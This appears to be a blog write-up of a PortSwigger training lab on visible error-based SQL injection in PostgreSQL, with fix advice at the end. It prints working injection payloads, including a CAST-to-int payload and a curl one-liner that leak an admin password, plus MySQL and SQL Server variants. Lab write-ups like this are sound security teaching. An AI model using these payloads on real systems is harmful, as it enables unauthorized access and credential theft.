---
title: "Visible error-based SQL injection"
date: 2026-07-02 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, cwe-209, sql-injection, error-based, postgresql]
description: "A PortSwigger Web Security Academy lab where the query result is never shown — but the app leaks raw database errors, so a single CAST-to-int type error hands you the admin password in one request, no blind guessing required."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Visible error-based SQL injection
---

## Overview

This [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based) lab is a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) on a **PostgreSQL** backend. The `TrackingId` cookie is concatenated into a query whose result is never displayed — but the application returns the database's **raw error messages** to the browser ([CWE-209](https://cwe.mitre.org/data/definitions/209.html), information exposure through an error message). That turns what would be a slow blind injection into a one-shot data leak.

> **Blind SQLi series.** The [conditional-responses]({% post_url 2026-06-30-Blind-SQL-injection-with-conditional-responses %}) and [conditional-errors]({% post_url 2026-07-01-Blind-SQL-injection-with-conditional-errors %}) labs had to infer the password one bit per request because the app leaked almost nothing. Here the app leaks its error text, so we skip inference entirely and read the value straight out of one error.
{: .prompt-info }

## The technique

A type-conversion error in PostgreSQL puts the offending value right into the error string. If we make the database try to cast a password to an integer, it tells us the password while complaining about it.

### Step 1 — confirm injection and read the query

Append a single quote to the cookie:

```
TrackingId=ogAZZfxtOKUELbuJ'
```

The response is a verbose error that even discloses the live SQL:

```
Unterminated string literal started at position 52 in SQL
SELECT * FROM tracking WHERE id = 'ogAZZfxtOKUELbuJ''. Expected char
```

Now we know the value sits inside a single-quoted string in `SELECT * FROM tracking WHERE id = '...'`.

### Step 2 — leak the password with a CAST error

Force PostgreSQL to cast the administrator's password to an integer:

```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Response:

```
ERROR: invalid input syntax for type integer: "85j3fvbqgfgjvhq0lgur"
```

The password is right there in the message. Three details make the payload parse cleanly:

- **`1=CAST(...)`** — `AND` expects a boolean, so a bare `CAST` errors with *"argument of AND must be type boolean"*. Comparing the cast to a number keeps the clause valid up to the point the cast fails.
- **`LIMIT 1`** — without it the subquery returns every row and you get *"more than one row returned by a subquery"* instead of the value.
- **Drop the original cookie value** — the query length-caps the input, and keeping the original `TrackingId` can truncate your trailing `--`, breaking the comment. Setting the cookie to just the payload frees up the characters.

`administrator` is the first row in `users`, so `LIMIT 1` lands on their password.

### Step 3 — log in

Log in as `administrator` with the leaked password and the lab is marked **Solved**.

One quick `curl` does the whole leak:

```bash
curl -sk -b "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -" \
  "https://<lab-id>.web-security-academy.net/" \
  | grep -oiE 'invalid input syntax for type integer: "[^"]*"'
```

## Why it works

This is the strongest error-based variant. In blind injection you arrange for the application to behave differently on true vs false and read one bit per request; here the application simply tells you the answer because it ships the database error to the client. Any app that surfaces raw DBMS errors is exposed to it — you just need a function that drops the target value into an error: PostgreSQL `CAST(... AS int)`, MySQL `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ...)))` or `UPDATEXML` (leaking between `~` delimiters, truncated to ~31 chars so page longer values with `SUBSTRING`), SQL Server `CONVERT(int,(SELECT ...))`.

## The fix

- **Parameterized queries / prepared statements.** Bind the cookie as data so it can never change the query — this closes the injection itself.
- **Never return raw database errors.** Show a generic error page to the client and log the real exception server-side only. This removes the leak channel even if an injection point slips through.
- **Least privilege.** Scope the database account so a successful injection reaches as little as possible.
